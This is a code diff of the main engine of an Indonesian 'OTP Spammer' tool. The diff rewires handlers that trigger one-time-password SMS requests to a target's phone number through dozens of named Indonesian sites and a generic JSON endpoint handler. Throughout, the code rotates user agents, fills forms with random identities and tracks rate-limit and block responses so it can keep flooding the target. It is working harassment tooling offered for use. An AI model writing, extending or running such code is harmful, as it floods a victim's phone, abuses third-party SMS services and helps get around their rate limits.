@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# main_engine.py - OTP Spammer Engine (FIXED)
+# main_engine.py - OTP Spammer Engine (Gabungan Full)
 # SCRIPETEREN OTP - scripeterenotp
 # Updated: Agustus 2026
 
@@ -16,14 +16,25 @@ import signal
 from colorama import Fore, Style, init
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-from utils import normalize, fmt_08, get_public_ip, get_random_user_agent, is_success_response
-from handlers import *
+from utils import normalize, fmt_08, get_public_ip, generate_multipart, extract_csrf, get_random_user_agent, is_success_response
+from handlers import (
+    send_hrsbre_otp, send_erafone_otp, send_planetban_otp,
+    send_tuneup_otp, send_hashmicro_otp, send_klook_otp,
+    send_internetrakyat_otp, send_ultramilk_register, send_kaniva_otp,
+    send_jembatani_otp, send_rcx_otp, send_sahabatteknisi_otp,
+    send_auto2000_otp, send_astra_daihatsu_otp, send_royal_canin_otp,
+    send_watsons_otp, send_99co_otp, send_belirumah_otp,
+    send_fastwork_otp, send_beautyhaul_otp, send_hainaya_otp,
+    send_minumyukkaka_otp, send_sidemang_otp, send_lapormasbup_otp,
+    send_ptsp_kemenag_otp
+)
 from targets import TARGETS
 
 init(autoreset=True)
 
 print_lock = threading.Lock()
 stop_flag = False
+RATE_LIMIT_KEYWORDS = ['rate limit', 'too many', 'try again', 'limit', 'exceeded', 'banned', 'blocked']
 global_callback = None
 
 def log_target(idx, total, name, status, detail=""):
@@ -49,299 +60,317 @@ def process_target(api, target62, ip, idx, total):
         return False
 
     name = api['name']
-    post_type = api.get('post_type', '')
     status_text = "FAIL"
     detail = ""
     success = False
-    resp = None
 
     try:
-        # Panggil fungsi berdasarkan post_type
-        if post_type == 'tokopedia':
-            resp = send_tokopedia_otp(api['number_fmt'](target62))
-        elif post_type == 'shopee':
-            resp = send_shopee_otp(api['number_fmt'](target62))
-        elif post_type == 'bukalapak':
-            resp = send_bukalapak_otp(api['number_fmt'](target62))
-        elif post_type == 'lazada':
-            resp = send_lazada_otp(api['number_fmt'](target62))
-        elif post_type == 'blibli':
-            resp = send_blibli_otp(api['number_fmt'](target62))
-        elif post_type == 'jdid':
-            resp = send_jdid_otp(api['number_fmt'](target62))
-        elif post_type == 'zalora':
-            resp = send_zalora_otp(api['number_fmt'](target62))
-        elif post_type == 'sociolla':
-            resp = send_sociolla_otp(api['number_fmt'](target62))
-        elif post_type == 'traveloka':
-            resp = send_traveloka_otp(api['number_fmt'](target62))
-        elif post_type == 'tiketcom':
-            resp = send_tiketcom_otp(api['number_fmt'](target62))
-        elif post_type == 'ovo':
-            resp = send_ovo_otp(api['number_fmt'](target62))
-        elif post_type == 'dana':
-            resp = send_dana_otp(api['number_fmt'](target62))
-        elif post_type == 'linkaja':
-            resp = send_linkaja_otp(api['number_fmt'](target62))
-        elif post_type == 'gopay':
-            resp = send_gopay_otp(api['number_fmt'](target62))
-        elif post_type == 'grabpay':
-            resp = send_grabpay_otp(api['number_fmt'](target62))
-        elif post_type == 'shopeepay':
-            resp = send_shopeepay_otp(api['number_fmt'](target62))
-        elif post_type == 'jenius':
-            resp = send_jenius_otp(api['number_fmt'](target62))
-        elif post_type == 'mybca':
-            resp = send_mybca_otp(api['number_fmt'](target62))
-        elif post_type == 'flip':
-            resp = send_flip_otp(api['number_fmt'](target62))
-        elif post_type == 'kredivo':
-            resp = send_kredivo_otp(api['number_fmt'](target62))
-        elif post_type == 'bca':
-            resp = send_bca_otp(api['number_fmt'](target62))
-        elif post_type == 'mandiri':
-            resp = send_mandiri_otp(api['number_fmt'](target62))
-        elif post_type == 'bni':
-            resp = send_bni_otp(api['number_fmt'](target62))
-        elif post_type == 'bri':
-            resp = send_bri_otp(api['number_fmt'](target62))
-        elif post_type == 'btn':
-            resp = send_btn_otp(api['number_fmt'](target62))
-        elif post_type == 'cimb':
-            resp = send_cimb_otp(api['number_fmt'](target62))
-        elif post_type == 'danamon':
-            resp = send_danamon_otp(api['number_fmt'](target62))
-        elif post_type == 'permata':
-            resp = send_permata_otp(api['number_fmt'](target62))
-        elif post_type == 'maybank':
-            resp = send_maybank_otp(api['number_fmt'](target62))
-        elif post_type == 'ocbc':
-            resp = send_ocbc_otp(api['number_fmt'](target62))
-        elif post_type == 'gojek':
-            resp = send_gojek_otp(api['number_fmt'](target62))
-        elif post_type == 'grab':
-            resp = send_grab_otp(api['number_fmt'](target62))
-        elif post_type == 'maxim':
-            resp = send_maxim_otp(api['number_fmt'](target62))
-        elif post_type == 'indrive':
-            resp = send_indrive_otp(api['number_fmt'](target62))
-        elif post_type == 'gofood':
-            resp = send_gofood_otp(api['number_fmt'](target62))
-        elif post_type == 'grabfood':
-            resp = send_grabfood_otp(api['number_fmt'](target62))
-        elif post_type == 'shopeefood':
-            resp = send_shopeefood_otp(api['number_fmt'](target62))
-        elif post_type == 'bluebird':
-            resp = send_bluebird_otp(api['number_fmt'](target62))
-        elif post_type == 'kfc':
-            resp = send_kfc_otp(api['number_fmt'](target62))
-        elif post_type == 'mcd':
-            resp = send_mcd_otp(api['number_fmt'](target62))
-        elif post_type == 'burgerking':
-            resp = send_burgerking_otp(api['number_fmt'](target62))
-        elif post_type == 'pizzahut':
-            resp = send_pizzahut_otp(api['number_fmt'](target62))
-        elif post_type == 'dominos':
-            resp = send_dominos_otp(api['number_fmt'](target62))
-        elif post_type == 'starbucks':
-            resp = send_starbucks_otp(api['number_fmt'](target62))
-        elif post_type == 'kopikenangan':
-            resp = send_kopikenangan_otp(api['number_fmt'](target62))
-        elif post_type == 'forecoffee':
-            resp = send_forecoffee_otp(api['number_fmt'](target62))
-        elif post_type == 'mytelkomsel':
-            resp = send_mytelkomsel_otp(api['number_fmt'](target62))
-        elif post_type == 'indosat':
-            resp = send_indosat_otp(api['number_fmt'](target62))
-        elif post_type == 'xl':
-            resp = send_xl_otp(api['number_fmt'](target62))
-        elif post_type == 'tri':
-            resp = send_tri_otp(api['number_fmt'](target62))
-        elif post_type == 'smartfren':
-            resp = send_smartfren_otp(api['number_fmt'](target62))
-        elif post_type == 'byu':
-            resp = send_byu_otp(api['number_fmt'](target62))
-        elif post_type == 'pln':
-            resp = send_pln_otp(api['number_fmt'](target62))
-        elif post_type == 'bpjs':
-            resp = send_bpjs_otp(api['number_fmt'](target62))
-        elif post_type == 'pedulilindungi':
-            resp = send_pedulilindungi_otp(api['number_fmt'](target62))
-        elif post_type == 'mypertamina':
-            resp = send_mypertamina_otp(api['number_fmt'](target62))
-        elif post_type == 'djp':
-            resp = send_djp_otp(api['number_fmt'](target62))
-        elif post_type == 'ehac':
-            resp = send_ehac_otp(api['number_fmt'](target62))
-        elif post_type == 'jnt':
-            resp = send_jnt_otp(api['number_fmt'](target62))
-        elif post_type == 'sicepat':
-            resp = send_sicepat_otp(api['number_fmt'](target62))
-        elif post_type == 'anteraja':
-            resp = send_anteraja_otp(api['number_fmt'](target62))
-        elif post_type == 'posindonesia':
-            resp = send_posindonesia_otp(api['number_fmt'](target62))
-        elif post_type == 'ninjaxpress':
-            resp = send_ninjaxpress_otp(api['number_fmt'](target62))
-        elif post_type == 'lionparcel':
-            resp = send_lionparcel_otp(api['number_fmt'](target62))
-        elif post_type == 'lionair':
-            resp = send_lionair_otp(api['number_fmt'](target62))
-        elif post_type == 'garuda':
-            resp = send_garuda_otp(api['number_fmt'](target62))
-        elif post_type == 'citilink':
-            resp = send_citilink_otp(api['number_fmt'](target62))
-        elif post_type == 'batikair':
-            resp = send_batikair_otp(api['number_fmt'](target62))
-        elif post_type == 'sriwijayaair':
-            resp = send_sriwijayaair_otp(api['number_fmt'](target62))
-        elif post_type == 'airasia':
-            resp = send_airasia_otp(api['number_fmt'](target62))
-        elif post_type == 'superindo':
-            resp = send_superindo_otp(api['number_fmt'](target62))
-        elif post_type == 'hypermart':
-            resp = send_hypermart_otp(api['number_fmt'](target62))
-        elif post_type == 'transmart':
-            resp = send_transmart_otp(api['number_fmt'](target62))
-        elif post_type == 'alfamart':
-            resp = send_alfamart_otp(api['number_fmt'](target62))
-        elif post_type == 'indomaret':
-            resp = send_indomaret_otp(api['number_fmt'](target62))
-        elif post_type == 'guardian':
-            resp = send_guardian_otp(api['number_fmt'](target62))
-        elif post_type == 'amazon':
-            resp = send_amazon_otp(api['number_fmt'](target62))
-        elif post_type == 'ebay':
-            resp = send_ebay_otp(api['number_fmt'](target62))
-        elif post_type == 'aliexpress':
-            resp = send_aliexpress_otp(api['number_fmt'](target62))
-        elif post_type == 'temu':
-            resp = send_temu_otp(api['number_fmt'](target62))
-        elif post_type == 'shein':
-            resp = send_shein_otp(api['number_fmt'](target62))
-        elif post_type == 'wish':
-            resp = send_wish_otp(api['number_fmt'](target62))
-        elif post_type == 'etsy':
-            resp = send_etsy_otp(api['number_fmt'](target62))
-        elif post_type == 'rakuten':
-            resp = send_rakuten_otp(api['number_fmt'](target62))
-        elif post_type == 'whatsapp_business':
-            resp = send_whatsapp_business_otp(api['number_fmt'](target62))
-        elif post_type == 'telegram':
-            resp = send_telegram_otp(api['number_fmt'](target62))
-        elif post_type == 'discord':
-            resp = send_discord_otp(api['number_fmt'](target62))
-        elif post_type == 'twitter':
-            resp = send_twitter_otp(api['number_fmt'](target62))
-        elif post_type == 'instagram':
-            resp = send_instagram_otp(api['number_fmt'](target62))
-        elif post_type == 'facebook':
-            resp = send_facebook_otp(api['number_fmt'](target62))
-        elif post_type == 'tiktok':
-            resp = send_tiktok_otp(api['number_fmt'](target62))
-        elif post_type == 'snapchat':
-            resp = send_snapchat_otp(api['number_fmt'](target62))
-        elif post_type == 'netflix':
-            resp = send_netflix_otp(api['number_fmt'](target62))
-        elif post_type == 'spotify':
-            resp = send_spotify_otp(api['number_fmt'](target62))
-        elif post_type == 'youtube':
-            resp = send_youtube_otp(api['number_fmt'](target62))
-        elif post_type == 'disney':
-            resp = send_disney_otp(api['number_fmt'](target62))
-        elif post_type == 'hbomax':
-            resp = send_hbomax_otp(api['number_fmt'](target62))
-        elif post_type == 'primevideo':
-            resp = send_primevideo_otp(api['number_fmt'](target62))
-        elif post_type == 'apple':
-            resp = send_apple_otp(api['number_fmt'](target62))
-        elif post_type == 'tiktokmusic':
-            resp = send_tiktokmusic_otp(api['number_fmt'](target62))
-        elif post_type == 'steam':
-            resp = send_steam_otp(api['number_fmt'](target62))
-        elif post_type == 'epic':
-            resp = send_epic_otp(api['number_fmt'](target62))
-        elif post_type == 'playstation':
-            resp = send_playstation_otp(api['number_fmt'](target62))
-        elif post_type == 'xbox':
-            resp = send_xbox_otp(api['number_fmt'](target62))
-        elif post_type == 'nintendo':
-            resp = send_nintendo_otp(api['number_fmt'](target62))
-        elif post_type == 'roblox':
-            resp = send_roblox_otp(api['number_fmt'](target62))
-        elif post_type == 'minecraft':
-            resp = send_minecraft_otp(api['number_fmt'](target62))
-        elif post_type == 'valorant':
-            resp = send_valorant_otp(api['number_fmt'](target62))
-        elif post_type == 'paypal':
-            resp = send_paypal_otp(api['number_fmt'](target62))
-        elif post_type == 'stripe':
-            resp = send_stripe_otp(api['number_fmt'](target62))
-        elif post_type == 'square':
-            resp = send_square_otp(api['number_fmt'](target62))
-        elif post_type == 'klarna':
-            resp = send_klarna_otp(api['number_fmt'](target62))
-        elif post_type == 'revolut':
-            resp = send_revolut_otp(api['number_fmt'](target62))
-        elif post_type == 'wise':
-            resp = send_wise_otp(api['number_fmt'](target62))
-        elif post_type == 'n26':
-            resp = send_n26_otp(api['number_fmt'](target62))
-        elif post_type == 'monzo':
-            resp = send_monzo_otp(api['number_fmt'](target62))
-        elif post_type == 'uber':
-            resp = send_uber_otp(api['number_fmt'](target62))
-        elif post_type == 'lyft':
-            resp = send_lyft_otp(api['number_fmt'](target62))
-        elif post_type == 'doordash':
-            resp = send_doordash_otp(api['number_fmt'](target62))
-        elif post_type == 'ubereats':
-            resp = send_ubereats_otp(api['number_fmt'](target62))
-        elif post_type == 'bolt':
-            resp = send_bolt_otp(api['number_fmt'](target62))
-        elif post_type == 'didi':
-            resp = send_didi_otp(api['number_fmt'](target62))
-        else:
-            status_text = "SKIP"
-            detail = f"Unknown post_type: {post_type}"
+        session = requests.Session()
+        session.headers.update({'User-Agent': get_random_user_agent()})
+        post_type = api.get('post_type', '')
 
-        # ============================================================
-        # Analisis response
-        # ============================================================
-        if resp is not None:
-            if is_success_response(resp):
-                status_text = "SUCCESS"
-                detail = "OTP sent"
-                success = True
-            else:
-                # Ambil pesan error dari body
+        # ---------- HANDLER SPESIFIK ----------
+        if post_type == 'hrsbre':
+            number = api['number_fmt'](target62)
+            code, text = send_hrsbre_otp(number)
+            if code in (200, 201):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'erafone':
+            number = api['number_fmt'](target62)
+            code, resp_text = send_erafone_otp(number)
+            if code == 200:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'planetban':
+            number = api['number_fmt'](target62)
+            resp = send_planetban_otp(number)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            elif resp and resp.status_code == 429:
+                status_text, detail = "LIMITED", "Rate limit"
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'tuneup':
+            number = api['number_fmt'](target62)
+            resp = send_tuneup_otp(number)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            elif resp and resp.status_code == 429:
+                status_text, detail = "LIMITED", "Rate limit"
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'hashmicro':
+            number = api['number_fmt'](target62)
+            form_data = send_hashmicro_otp(number)
+            if form_data:
+                url = "https://website-api.hashmicro.com/api/add/3"
+                payload = '&'.join([f"{k}={requests.utils.quote(str(v))}" for k, v in form_data.items()])
+                resp = session.post(url, data=payload, timeout=15)
+                if resp.status_code in (200, 201):
+                    status_text, detail, success = "SUCCESS", "OTP sent", True
+                elif resp.status_code == 429:
+                    status_text, detail = "LIMITED", "Rate limit"
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'klook':
+            number = api['number_fmt'](target62)
+            resp = send_klook_otp(number)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'internetrakyat':
+            number = api['number_fmt'](target62)
+            resp = send_internetrakyat_otp(number)
+            if resp and resp.status_code in (200, 201):
                 try:
-                    err_data = resp.json()
-                    err_msg = err_data.get('message') or err_data.get('msg') or err_data.get('error') or ''
-                    if err_msg:
-                        detail = err_msg[:40]
-                    else:
-                        detail = f"HTTP {resp.status_code}"
+                    if resp.json().get("statusCode") == 200:
+                        status_text, detail, success = "SUCCESS", "OTP sent", True
                 except:
-                    detail = f"HTTP {resp.status_code}"
-                if resp.status_code == 429:
-                    status_text = "LIMITED"
+                    status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'ultramilk':
+            number = api['number_fmt'](target62)
+            resp = send_ultramilk_register(number)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'kaniva':
+            number = api['number_fmt'](target62)
+            name_rand = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
+            resp = send_kaniva_otp(number, name_rand)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'jembatani':
+            number = api['number_fmt'](target62)
+            name_rand = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
+            password = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
+            resp = send_jembatani_otp(number, name_rand, password)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'rcx':
+            number = api['number_fmt'](target62)
+            name_rand = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
+            email = f'user{random.randint(1000,9999)}@mailnesia.com'
+            resp = send_rcx_otp(number, name_rand, email)
+            if resp and resp.status_code in (302, 303):
+                status_text, detail, success = "SUCCESS", "OTP triggered", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'sahabatteknisi':
+            number = api['number_fmt'](target62)
+            resp = send_sahabatteknisi_otp(number)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'auto2000':
+            number = api['number_fmt'](target62)
+            resp = send_auto2000_otp(number)
+            if resp and resp.status_code == 200:
+                try:
+                    if resp.json().get("acknowledge") == 1:
+                        status_text, detail, success = "SUCCESS", "OTP sent", True
+                except:
+                    status_text, detail, success = "SUCCESS", "OTP sent", True
+            elif resp and resp.status_code == 429:
+                status_text, detail = "LIMITED", "Rate limit"
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'astra_daihatsu':
+            number = api['number_fmt'](target62)
+            resp = send_astra_daihatsu_otp(number)
+            if resp and resp.status_code == 200:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'royal_canin':
+            number = api['number_fmt'](target62)
+            resp = send_royal_canin_otp(number)
+            if resp and resp.status_code == 200:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'watsons':
+            number = api['number_fmt'](target62)
+            resp = send_watsons_otp(number)
+            if resp and resp.status_code == 200:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == '99co':
+            number = api['number_fmt'](target62)
+            resp = send_99co_otp(number)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'belirumahco':
+            number = api['number_fmt'](target62)
+            resp = send_belirumah_otp(number)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'fastworkid':
+            number = api['number_fmt'](target62)
+            resp = send_fastwork_otp(number)
+            if resp and resp.status_code in (200, 201) and is_success_response(resp):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'beautyhaul':
+            number = api['number_fmt'](target62)
+            resp = send_beautyhaul_otp(number)
+            if resp and resp.status_code in (200, 201):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'hainaya':
+            number = api['number_fmt'](target62)
+            resp = send_hainaya_otp(number)
+            if resp and resp.status_code in (200, 201, 409):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'minumyukkaka':
+            number = api['number_fmt'](target62)
+            resp = send_minumyukkaka_otp(number)
+            if resp and resp.status_code == 200:
+                try:
+                    if resp.json().get('IsSuccess') == True:
+                        status_text, detail, success = "SUCCESS", "OTP sent", True
+                except:
+                    status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'sidemang':
+            number = api['number_fmt'](target62)
+            resp = send_sidemang_otp(number)
+            if resp and resp.status_code == 200:
+                try:
+                    if resp.json().get('otpDispatched') == True:
+                        status_text, detail, success = "SUCCESS", "OTP sent", True
+                except:
+                    status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'lapormasbup':
+            number = api['number_fmt'](target62)
+            resp, is_resend = send_lapormasbup_otp(number)
+            if resp and resp.status_code in (200, 201):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        elif post_type == 'ptspkemenag':
+            number = api['number_fmt'](target62)
+            resp = send_ptsp_kemenag_otp(number)
+            if resp and resp.status_code in (200, 201):
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            log_target(idx, total, name, status_text, detail)
+            return success
+
+        # ---------- JSON HANDLER ----------
+        elif post_type == 'json':
+            number = api['number_fmt'](target62)
+            url = api.get('url', '').replace('{rand}', str(uuid.uuid4()))
+            referer = api.get('referer', '').replace('{raw}', target62)
+            if referer:
+                try:
+                    session.get(referer, timeout=8)
+                except:
+                    pass
+            payload_str = api['payload'].replace('{number}', str(number))\
+                .replace('{rand}', str(uuid.uuid4()))\
+                .replace('{ip}', ip)\
+                .replace('{raw}', target62)\
+                .replace('{name}', 'User'+str(random.randint(100,999)))\
+                .replace('{email}', f'user{random.randint(1000,9999)}@mailnesia.com')\
+                .replace('{pw}', 'Pass'+''.join(random.choices(string.ascii_letters+string.digits, k=6))+'@1')
+            headers = api.get('headers', {}).copy()
+            headers['User-Agent'] = get_random_user_agent()
+            resp = session.post(url, headers=headers, data=payload_str, timeout=15)
+            if resp.status_code in (200, 201, 202):
+                # cek body jika ada indikasi error
+                if is_success_response(resp):
+                    status_text, detail, success = "SUCCESS", "OTP sent", True
+                else:
+                    # ambil pesan error
+                    try:
+                        err = resp.json().get('message', '')
+                        if err:
+                            detail = err[:40]
+                        else:
+                            detail = f"HTTP {resp.status_code}"
+                    except:
+                        detail = f"HTTP {resp.status_code}"
+                    status_text = "FAIL"
+            elif resp.status_code == 429:
+                status_text, detail = "LIMITED", "Rate limit"
+            elif resp.status_code == 403:
+                status_text, detail = "BLOCKED", "Forbidden"
+            else:
+                text = resp.text.lower() if resp.text else ""
+                keywords = api.get('success_on', [])
+                if any(kw in text for kw in keywords):
+                    status_text, detail, success = "SUCCESS", "OTP sent", True
                 else:
                     status_text = "FAIL"
+                    detail = f"({resp.status_code})"
+            log_target(idx, total, name, status_text, detail)
+            return success
+
         else:
-            status_text = "ERROR"
-            detail = "No response (exception/timeout)"
+            status_text = "SKIP"
+            detail = "Unknown post_type"
+            log_target(idx, total, name, status_text, detail)
+            return False
 
     except requests.exceptions.Timeout:
-        status_text, detail = "TIMEOUT", ""
+        log_target(idx, total, name, "TIMEOUT", "")
     except requests.exceptions.ConnectionError:
-        status_text, detail = "CONN_ERR", ""
+        log_target(idx, total, name, "CONN_ERR", "")
     except Exception as e:
-        status_text, detail = "ERROR", str(e)[:40]
+        log_target(idx, total, name, "ERROR", str(e)[:40])
 
-    log_target(idx, total, name, status_text, detail)
-    time.sleep(0.5 if success else 0.2)
     return success
+
+# ============================================================
+# Fungsi run_single_round dan run_infinite_loop (tetap sama)
+# ============================================================
 
 def run_single_round(threads=5, target=None, callback=None):
     global stop_flag, global_callback
